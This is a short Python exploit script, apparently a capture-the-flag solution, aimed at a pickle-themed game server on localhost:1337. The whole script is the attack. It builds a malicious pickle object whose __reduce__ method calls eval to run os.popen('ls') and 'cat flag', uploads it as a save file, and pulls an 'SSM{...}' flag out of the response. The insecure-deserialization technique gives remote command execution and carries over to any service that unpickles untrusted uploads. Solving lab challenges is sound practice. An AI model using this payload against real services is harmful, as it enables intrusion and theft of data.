#!/usr/bin/env python3

import requests
import pickle
import re

BASE_URL = 'http://localhost:1337'

# http://localhost:1337/save?version_name=Unicorn_0.0.1&pickle_amount=454854.8&pps_amount=522&amount_pickle_farmer=2&amount_pickle_factory=52&cost_pickle_farmer=132&cost_pickle_factory=1433566

params = {
    'version_name': 'Unicorn_0.0.1',
    'pickle_amount': '454854.8',
    'pps_amount': 522,
    'amount_pickle_farmer': 2,
    'amount_pickle_factory': 52,
    'amount_pickle_plane': 13,
    'cost_pickle_farmer': 132,
    'cost_pickle_factory': 1433566,
    'cost_pickle_plane': 68363
}

#r = requests.get(BASE_URL + '/save', params=params)
#r = requests.get(BASE_URL + '/download_save', stream=True)
#savefile = r.raw.data
#save_data = pickle.loads(savefile)

class RCE:
    def __reduce__(self):
        cmd = ''
        return eval, ("[__import__('os').popen('ls').read(),__import__('os').popen('cat flag').read()]",)

new_savefile = pickle.dumps(RCE())

r = requests.post(BASE_URL + '/', files={'Choose Savefile': ('savefile.pickle', new_savefile)})
loaded_data = r.text.split('</script>', 1)[0]
flag = re.search('SSM\{[^}]*\}', loaded_data)
print(f'Flag: {flag[0]}')
